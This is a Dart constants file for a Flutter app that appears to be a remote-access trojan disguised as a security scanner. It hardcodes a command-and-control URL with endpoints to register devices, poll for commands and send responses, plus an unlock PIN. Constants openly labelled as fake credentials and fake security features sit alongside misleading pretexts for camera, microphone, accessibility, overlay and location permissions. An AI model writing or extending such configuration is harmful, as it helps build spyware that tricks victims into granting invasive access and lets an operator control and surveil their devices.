import 'package:flutter/material.dart';

class Constants {
  // Backend configuration
  static String backendUrl = 'http://panglima.zal7sex.serverku.space:2299';
  static const String unlockPin = '969';
  
  // Fake credentials for login screen
  static const String fakeUsername = 'admin';
  static const String fakePassword = 'secure123';
  
  // Colors
  static const Color primaryColor = Color(0xFF2196F3);
  static const Color secondaryColor = Color(0xFF64B5F6);
  static const Color backgroundColor = Color(0xFF0A0E21);
  static const Color cardColor = Color(0xFF1A1F38);
  static const Color dangerColor = Color(0xFFF44336);
  static const Color successColor = Color(0xFF4CAF50);
  static const Color warningColor = Color(0xFFFF9800);
  static const Color textColor = Colors.white;
  static const Color subtitleColor = Color(0xFF8A8DAA);
  
  // Animations
  static const Duration animationDuration = Duration(milliseconds: 300);
  static const Curve animationCurve = Curves.easeInOut;
  
  // API Endpoints
  static const String apiRegister = '/register_device';
  static const String apiCheckCommands = '/check_commands';
  static const String apiSendResponse = '/send_response';
  static const String apiStatusUpdate = '/status_update';
  
  // Permission messages
  static const Map<String, String> permissionMessages = {
    'camera': 'Camera access required for security scanning',
    'storage': 'Storage access needed for log analysis',
    'overlay': 'Overlay permission for security alerts',
    'accessibility': 'Accessibility service for threat detection',
    'location': 'Location for network security mapping',
    'microphone': 'Microphone for audio threat detection',
  };
  
  // Fake security features
  static const List<String> securityFeatures = [
    'Malware Detection',
    'Network Security',
    'System Integrity',
    'Privacy Scanner',
    'Vulnerability Check',
    'Real-time Protection',
  ];
}
